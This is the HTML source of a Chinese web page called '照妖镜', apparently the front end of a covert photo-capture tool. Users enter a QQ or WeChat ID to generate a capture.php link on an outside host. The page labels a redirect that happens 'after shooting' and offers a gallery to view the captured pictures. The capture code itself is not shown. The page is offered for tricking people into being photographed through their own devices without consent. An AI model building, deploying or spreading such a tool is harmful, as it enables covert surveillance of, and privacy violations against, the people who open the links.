<!DOCTYPE html>
<html lang="zh-CN">
	<head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<meta name="format-detection" content="telephone=no">
		<meta name="apple-mobile-web-app-capable" content="yes">
		<meta name="apple-mobile-web-app-status-bar-style" content="black">
		<title>照妖镜</title>
		<meta name="keywords" content="照妖镜" />
		<!--<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
		<script type="text/javascript" src="js/main.js"></script>
		<link href="css/bootstrap.css" rel="stylesheet" type="text/css">-->
		<link href="https://cdn.bootcss.com/bootstrap/3.3.4/css/bootstrap.css" rel="stylesheet">
		<link href="css/shop_style.css" rel="stylesheet" type="text/css">
		<link href="css/shop.css" rel="stylesheet" type="text/css">
		<link href="css/style.css" rel="stylesheet" type="text/css">
		<script>
			var _hmt = _hmt || [];
			(function() {
				var hm = document.createElement("script");
				hm.src = "https://hm.baidu.com/hm.js?773e85849e55600608d7c2aa1f35c094";
				var s = document.getElementsByTagName("script")[0];
				s.parentNode.insertBefore(hm, s);
			})();
		</script>
	</head>
	<body>
		<style>
			#M1 {
				width: 110px;
				height: 35px;
				padding-top: 2px\9;
				/* cursor: pointer; */
				color: #fff;
				font-size: 15px;
				/* letter-spacing: 1px; */
				background: #3385ff;
				/* border-bottom: 1px solid #2d78f4; */
				/* outline: medium; */
				border-bottom: none;
				-webkit-appearance: none;
				-webkit-border-radius: 0;
				border: 0;
				text-align: center;
				text-decoration: none;
				color: #fff;
				background-color: #007bff;
				border-color: #007bff;
				padding: 7px;
				float: left;
				margin-left: 2%;
				margin-top: 2%;
			}

			a {
				color: #8DC8FD;
				text-decoration: none;
			}
		</style>

		<script>
			function create() {
				var input = document.getElementById('content');
				var kd = document.getElementById('kd');
				var myid = document.getElementById('myid');
				var url = document.getElementById('url');
				if (myid.value == "" || url.value == "") {
					alert("ID或跳转地址不能为空！");
					return false;
				}
				kd.href = 'https://zhaoyaojing.wanxiangyuanma.com/capture.php?id=' + myid.value + '&url=' + url.value;
				kd.style = '';
				kd.innerText = 'https://zhaoyaojing.wanxiangyuanma.com/capture.php?id=' + myid.value + '&url=' + url
					.value;
			}
		</script>
		<div id="bob">


			<div id="bd">
				<div class="ct" style="padding:0;">
					<section class="index">
						<div id="bds">
							<div id="content">
								<div class="hd">

									<img src="images/3.webp">
								</div>
								<div class="mall" id="contentss">

									<div class="mianban">
										<div class="wrap">
											<div class="tabs">
											<div class="swiper-container">
												<div class="content-slide">
													<div class="purchase_from">
														<ul id="Open" style="display:block;">
															<form action="?" class="form-sign" method="get" name="auth"
																onSubmit="return checkURL();">
																<li>
																	<input type="text" class="form-control" id="myid"
																		placeholder="填写QQ号、微信号生成链接" value>
																	<p>拍摄后跳转到：</p>
																	<input type="text" class="form-control" id="url"
																		value="https://www.baidu.com/">
																</li>
																<li>
																	<input type="button" value="生成链接"
																		onclick="create();"
																		style="display: block;background: #FFFFFF!important;height: 40px;font-size: 16px;color: #5AB5FB;border-radius: 4px;text-align: center;overflow: hidden;">
																	<br>
																</li>
																<li class="btn_purchase">
																	<input type="button" value="查看图片"
																		onclick="window.location.href='gallery.php?id='+document.getElementById('myid').value"
																		style="display: block;background: #FFFFFF!important;height: 40px;font-size: 16px;color: #5AB5FB;border-radius: 4px;text-align: center;overflow: hidden;">
																</li>
																<div class="alert alert-success">
																	<a id="kd" style="pointer-events: none;">请生成链接！</a>
																</div>
																<span id="Order"></span>
															</form>
														</ul>
														<ul id="gallery" style="display: none;">
															<form action="?" class="form-sign" method="get" name="auth"
																onSubmit="return checkURL();">
																<li class="btn_purchase">



																</li>

																<span id="Orderd"></span>
															</form>
														</ul>
														<ul id="Back" style="display:none;">
															<center>
																<h4 class="hd_tit"
																	style="height:auto;line-height:normal;padding:10px;color:#FFFFFF;">
																	本站温馨提示<br>
																	<span
																		style="font-size:13px;color:red;">填写数据，生成链接</span>
																</h4>

															</center>
															<div class="list-group-item text-center">
																</p>
															</div>
															<span id="Order"></span>
														</ul>
													</div>
												</div>
											</div>
